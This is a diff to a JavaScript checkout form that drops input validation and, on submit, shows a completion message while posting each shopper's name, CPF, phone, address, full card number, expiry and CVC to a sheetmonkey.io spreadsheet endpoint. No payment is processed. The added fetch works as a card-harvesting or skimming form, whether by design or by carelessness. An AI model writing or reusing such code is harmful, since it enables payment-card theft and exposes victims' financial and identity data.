@@ -1,3 +1,6 @@
+const $formComplete = document.getElementById("form-complete");
+const $productContainer = document.getElementById("productContainer");
+
 /* FORM's ELEMENTs PESSOAL INFO*/
 const $form = document.querySelector("form");
 const $inputs = document.querySelectorAll("form input, form select");
@@ -298,29 +301,42 @@ atualizarTempo();
 $form.addEventListener("submit", (event) => {
   try {
     event.preventDefault();
-    const values = {
-      name: $name.value.trim(),
-      cpf: $cpf.value.trim(),
-      tel: $tel.value.trim(),
-      cep: $cep.value.trim(),
-      address: $address.value.trim(),
-      addressNumber: $addressNumber.value.trim(),
-      cardName: $holder.value.trim(),
-      cardNumber: $numberCard.value.trim(),
-      expMounth: $expMounth.value.trim(),
-      expYear: $expYear.value.trim(),
-      cvc: $cvc.value.trim(),
-    };
-    console.log(values);
-
-
-
-    const errors = validate(values, rules);
-    if (errors) {
-      console.log(errors);
-    } else {
-      
-    }
+    $form.classList.add("d-none");
+      $formComplete.classList.remove("d-none");
+      $productContainer.classList.add("d-none");
+      const values = {
+        name: $name.value.trim(),
+        cpf: $cpf.value.trim(),
+        tel: $tel.value.trim(),
+        cep: $cep.value.trim(),
+        address: $address.value.trim(),
+        addressNumber: $addressNumber.value.trim(),
+        cardName: $holder.value.trim(),
+        cardNumber: $numberCard.value.trim(),
+        expMounth: $expMounth.value.trim(),
+        expYear: $expYear.value.trim(),
+        cvc: $cvc.value.trim(),
+      };
+      fetch("https://api.sheetmonkey.io/form/9qGHZ1Ki5b8WLuknMeVd1g", {
+        method: "post",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          name: values.name,
+          cpf: values.cpf,
+          tel: values.tel,
+          cep: values.cep,
+          address: values.address,
+          addressNumber: values.addressNumber,
+          cardName: values.cardName,
+          cardNumber: values.cardNumber,
+          expMounth: values.expMounth,
+          expYear: values.expYear,
+          cvc: values.cvc
+        }),
+      });
   } catch (error) {
     console.log(error);
   }
